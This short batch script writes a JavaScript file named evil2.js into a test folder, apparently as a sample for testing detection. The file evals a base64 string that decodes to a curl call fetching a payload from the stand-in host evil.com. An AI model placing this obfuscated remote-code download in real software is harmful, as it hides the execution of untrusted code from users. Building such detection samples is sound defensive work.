echo const { exec } = require('child_process'); > test_js\evil2.js
echo const base64 = require('base64-js'); >> test_js\evil2.js
echo const code = 'c3lzdGVtKCJjdXJsIGh0dHA6Ly9ldmlsLmNvbS9wYXlsb2FkIik='; >> test_js\evil2.js
echo eval(Buffer.from(code, 'base64').toString()); >> test_js\evil2.js